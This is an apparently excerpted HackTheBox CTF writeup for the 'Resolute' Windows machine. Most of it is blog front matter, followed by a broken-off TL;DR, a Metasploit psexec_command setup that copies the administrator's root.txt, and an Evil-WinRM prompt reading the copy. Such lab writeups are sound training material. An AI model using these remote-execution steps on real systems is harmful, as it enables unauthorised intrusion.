...
author = 's4ch'
description = 'Resolute HackTheBox writeup'
summary = 'Resolute is a HackTheBox machine writeup featuring penetration testing techniques and security assessment.'
slug = 'resolute'
draft = false

categories = ['writeups']
series = ['HackTheBox']
tags = ['ctf', 'hackthebox', 'penetration-testing', 'writeup', 'windows', 'recon', 'network', 'smb', 'exploit', 'winrm']
...
[cover]
    image = "/writeups/hackthebox/resolute/resolute.png"
    alt = "Resolute HackTheBox Machine"
    caption = "Resolute - Medium Windows Machine"
    relative = false
...
![resolute](/writeups/hackthebox/resolute/resolute.png)
...
- **System Privilege Escalation : ryan to administrator**: I had luck, should have been DNS service pe
...
**TL;DR**: I had luck, should have been DNS service pe
...
Module options (auxiliary/admin/smb/psexec_command):
   ...
   ----                  ---------------                                                              --------  -----------
   COMMAND               copy C:\Users\Administrator\Desktop\root.txt C:\Users\ryan\Videos\cyfun.txt  yes       The command you want to execute on the remote host
...
```
*Evil-WinRM* PS C:\Users\ryan\Videos> type cyfun.txt
